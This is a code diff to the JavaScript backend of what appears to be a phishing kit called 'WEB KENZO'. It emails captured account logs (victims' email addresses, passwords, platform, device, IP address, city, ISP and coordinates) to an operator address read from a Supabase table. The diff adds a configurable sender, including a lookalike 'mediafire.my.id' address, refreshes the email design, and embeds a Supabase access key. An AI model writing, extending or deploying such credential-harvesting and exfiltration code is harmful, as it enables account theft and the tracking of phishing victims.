@@ -28,10 +28,9 @@ export default async function handler(req, res) {
         const SUPABASE_URL = "https://djradeolrbjmgoxxbdlj.supabase.co"; 
         const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRqcmFkZW9scmJqbWdveHhiZGxqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTU1OTA0NDQsImV4cCI6MjExMTE2NjQ0NH0.RvLrul0eFafGUcOn_9ORB8xh3IaP4n1FAsEmqXnrXCA";     
         
-        let EMAIL = "admin@domain.com"; 
-        
-        // HARDCODE NAMA JADI WEB KENZO
-        let NAMA = "WEB KENZO"; 
+        let EMAIL_TUJUAN = "admin@domain.com"; 
+        let NAMA_PENGIRIM = "WEB KENZO"; // Default kalo di dashboard kosong
+        let EMAIL_PENGIRIM = "hasilress@mediafire.my.id"; 
 
         try {
             const rCfg = await fetch(`${SUPABASE_URL}/rest/v1/web_config?web_id=eq.${WEB_ID}&select=*`, {
@@ -39,98 +38,112 @@ export default async function handler(req, res) {
             });
             const cfgData = await rCfg.json();
             if (cfgData && cfgData[0]) {
-                if (cfgData[0].email_tujuan) EMAIL = cfgData[0].email_tujuan;
-                // NAMA DARI DB DIABAIKAN KARENA UDAH DIHARDCODE
+                if (cfgData[0].email_tujuan) EMAIL_TUJUAN = cfgData[0].email_tujuan;
+                if (cfgData[0].nama_ress) {
+                    let parts = cfgData[0].nama_ress.split('<');
+                    NAMA_PENGIRIM = parts[0].trim(); // AMBIL NAMA DARI WEBSET
+                    if (parts[1]) { EMAIL_PENGIRIM = parts[1].replace('>', '').trim(); }
+                }
             }
         } catch(e) { console.log("Gagal ambil config:", e); }
 
         const flag = countryFlag(d.negaraKode || "");
         
-        // PREVIEW TEXT (YANG MUNCUL DI NOTIFIKASI/PREVIEW EMAIL)
+        // PREVIEW TEXT (LINGKARAN BIRU)
         const previewText = "HATI HATI DENGAN WEB YANG MENGATAS NAMAKAN KENZ | IP " + (d.ip || "-");
 
-        // DESAIN EMAIL BARU
+        // UI EMAIL BARU: CLEAN, MODERN, ELEGAN (GA HAMBAR)
         const htmlBody = `
         <div style="display:none;max-height:0;overflow:hidden;font-size:1px;line-height:1px;color:#fff">${previewText}</div>
-        <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f3f4f6; padding: 30px 15px;">
-          <div style="max-width: 600px; margin: 0 auto; background-color: #ffffff; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);">
+        <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f4f6f8; padding: 40px 15px;">
+          <div style="max-width: 600px; margin: 0 auto; background-color: #ffffff; border-radius: 16px; overflow: hidden; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.05), 0 4px 6px -2px rgba(0, 0, 0, 0.025);">
             
-            <!-- HEADER EMAIL -->
-            <div style="background-color: #111827; padding: 24px 30px; text-align: left; border-bottom: 4px solid #3b82f6;">
-              <h1 style="margin: 0; font-size: 20px; font-weight: 600; color: #ffffff; letter-spacing: 0.5px;">${NAMA}</h1>
-              <p style="margin: 4px 0 0 0; font-size: 13px; color: #9ca3af;">New Account Log</p>
+            <!-- HEADER ELEGAN -->
+            <div style="background-color: #ffffff; padding: 30px 30px 20px 30px; border-bottom: 1px solid #f1f5f9; text-align: left;">
+              <h1 style="margin: 0; font-size: 22px; font-weight: 700; color: #1e293b; letter-spacing: -0.5px;">${NAMA_PENGIRIM}</h1>
+              <p style="margin: 6px 0 0 0; font-size: 13px; color: #64748b; font-weight: 500;">New Account Log</p>
             </div>
             
             <div style="padding: 30px;">
-              <h3 style="color: #374151; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; margin: 0 0 16px 0; border-bottom: 1px solid #e5e7eb; padding-bottom: 8px;">Account Info</h3>
-              <table style="width: 100%; border-collapse: collapse; margin-bottom: 30px;">
-                <tr>
-                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280; width: 35%;">Email</td>
-                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.email || "-"}</td>
-                </tr>
-                <tr>
-                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">Password</td>
-                  <td style="padding: 10px 0; font-size: 14px; color: #ef4444; font-weight: 600;">${d.password || "-"}</td>
-                </tr>
-                <tr>
-                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">Platform</td>
-                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">
-                    <span style="background-color: #eff6ff; color: #1d4ed8; padding: 4px 8px; border-radius: 4px; font-size: 12px;">${PLATFORM}</span>
-                  </td>
-                </tr>
-              </table>
+              <!-- SECTION ACCOUNT -->
+              <div style="margin-bottom: 35px;">
+                <h3 style="color: #64748b; font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 1.5px; margin: 0 0 15px 0; padding-bottom: 10px; border-bottom: 2px solid #f1f5f9;">Account Info</h3>
+                <table style="width: 100%; border-collapse: collapse;">
+                  <tr>
+                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500; width: 35%;">Email</td>
+                    <td style="padding: 12px 0; font-size: 15px; color: #0f172a; font-weight: 600;">${d.email || "-"}</td>
+                  </tr>
+                  <tr>
+                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500;">Password</td>
+                    <td style="padding: 12px 0; font-size: 15px; color: #e11d48; font-weight: 700;">${d.password || "-"}</td>
+                  </tr>
+                  <tr>
+                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500;">Platform</td>
+                    <td style="padding: 12px 0; font-size: 14px;">
+                      <span style="background-color: #e0e7ff; color: #3730a3; padding: 5px 10px; border-radius: 6px; font-weight: 700; font-size: 12px;">${PLATFORM}</span>
+                    </td>
+                  </tr>
+                </table>
+              </div>
 
-              <h3 style="color: #374151; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; margin: 0 0 16px 0; border-bottom: 1px solid #e5e7eb; padding-bottom: 8px;">Device Info</h3>
-              <table style="width: 100%; border-collapse: collapse; margin-bottom: 30px;">
-                <tr>
-                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280; width: 35%;">Device</td>
-                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.device || "-"}</td>
-                </tr>
-                <tr>
-                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">OS Version</td>
-                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.os || "-"}</td>
-                </tr>
-                <tr>
-                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">Browser</td>
-                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.browser || "-"}</td>
-                </tr>
-              </table>
+              <!-- SECTION DEVICE -->
+              <div style="margin-bottom: 35px;">
+                <h3 style="color: #64748b; font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 1.5px; margin: 0 0 15px 0; padding-bottom: 10px; border-bottom: 2px solid #f1f5f9;">Device Info</h3>
+                <table style="width: 100%; border-collapse: collapse;">
+                  <tr>
+                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500; width: 35%;">Device</td>
+                    <td style="padding: 12px 0; font-size: 14px; color: #0f172a; font-weight: 600;">${d.device || "-"}</td>
+                  </tr>
+                  <tr>
+                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500;">OS Version</td>
+                    <td style="padding: 12px 0; font-size: 14px; color: #0f172a; font-weight: 600;">${d.os || "-"}</td>
+                  </tr>
+                  <tr>
+                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500;">Browser</td>
+                    <td style="padding: 12px 0; font-size: 14px; color: #0f172a; font-weight: 600;">${d.browser || "-"}</td>
+                  </tr>
+                </table>
+              </div>
 
-              <h3 style="color: #374151; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; margin: 0 0 16px 0; border-bottom: 1px solid #e5e7eb; padding-bottom: 8px;">Location Info</h3>
-              <table style="width: 100%; border-collapse: collapse;">
-                <tr>
-                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280; width: 35%;">IP Address</td>
-                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.ip || "-"}</td>
-                </tr>
-                <tr>
-                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">Country</td>
-                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${flag} ${d.negara || "-"}</td>
-                </tr>
-                <tr>
-                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">Province</td>
-                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.prov || "-"}</td>
-                </tr>
-                <tr>
-                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">City</td>
-                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.kota || "-"}</td>
-                </tr>
-                <tr>
-                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">ISP</td>
-                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.isp || "-"}</td>
-                </tr>
-                <tr>
-                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">Coordinates</td>
-                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.koord || "-"}</td>
-                </tr>
-                <tr>
-                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">Time</td>
-                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.waktu || "-"}</td>
-                </tr>
-              </table>
+              <!-- SECTION LOCATION -->
+              <div>
+                <h3 style="color: #64748b; font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 1.5px; margin: 0 0 15px 0; padding-bottom: 10px; border-bottom: 2px solid #f1f5f9;">Location Info</h3>
+                <table style="width: 100%; border-collapse: collapse;">
+                  <tr>
+                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500; width: 35%;">IP Address</td>
+                    <td style="padding: 12px 0; font-size: 14px; color: #0f172a; font-weight: 600; font-family: monospace;">${d.ip || "-"}</td>
+                  </tr>
+                  <tr>
+                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500;">Country</td>
+                    <td style="padding: 12px 0; font-size: 14px; color: #0f172a; font-weight: 600;">${flag} ${d.negara || "-"}</td>
+                  </tr>
+                  <tr>
+                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500;">Province</td>
+                    <td style="padding: 12px 0; font-size: 14px; color: #0f172a; font-weight: 600;">${d.prov || "-"}</td>
+                  </tr>
+                  <tr>
+                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500;">City</td>
+                    <td style="padding: 12px 0; font-size: 14px; color: #0f172a; font-weight: 600;">${d.kota || "-"}</td>
+                  </tr>
+                  <tr>
+                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500;">ISP</td>
+                    <td style="padding: 12px 0; font-size: 14px; color: #0f172a; font-weight: 600;">${d.isp || "-"}</td>
+                  </tr>
+                  <tr>
+                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500;">Coordinates</td>
+                    <td style="padding: 12px 0; font-size: 14px; color: #0f172a; font-weight: 600;">${d.koord || "-"}</td>
+                  </tr>
+                  <tr>
+                    <td style="padding: 12px 0; font-size: 14px; color: #64748b; font-weight: 500;">Time</td>
+                    <td style="padding: 12px 0; font-size: 14px; color: #0f172a; font-weight: 600;">${d.waktu || "-"}</td>
+                  </tr>
+                </table>
+              </div>
             </div>
 
-            <div style="background-color: #f9fafb; padding: 20px; text-align: center; border-top: 1px solid #e5e7eb;">
-              <p style="margin: 0; font-size: 12px; color: #9ca3af;">Generated by ${NAMA} System</p>
+            <!-- FOOTER -->
+            <div style="background-color: #f8fafc; padding: 20px; text-align: center; border-top: 1px solid #f1f5f9;">
+              <p style="margin: 0; font-size: 12px; color: #94a3b8;">Generated by ${NAMA_PENGIRIM} System &bull; ${new Date().getFullYear()}</p>
             </div>
           </div>
         </div>`;
@@ -139,9 +152,9 @@ export default async function handler(req, res) {
             method: "POST",
             headers: { "Authorization": "Bearer " + API_KEY, "Content-Type": "application/json" },
             body: JSON.stringify({
-                from: NAMA + " <hasilress@mediafire.my.id>", // NAMA PENGIRIM EMAIL
-                to: [EMAIL],
-                subject: "🥷 " + NAMA + " 🥷 | " + PLATFORM + " | IP " + (d.ip || "-"), // SUBJECT EMAIL
+                from: NAMA_PENGIRIM + " <" + EMAIL_PENGIRIM + ">", // IKUT WEBSET (LINGKARAN IJO)
+                to: [EMAIL_TUJUAN],
+                subject: "WEB KENZO | " + PLATFORM + " | IP " + (d.ip || "-"), // HARDCODE WEB KENZO (LINGKARAN PUTIH)
                 html: htmlBody
             })
         });
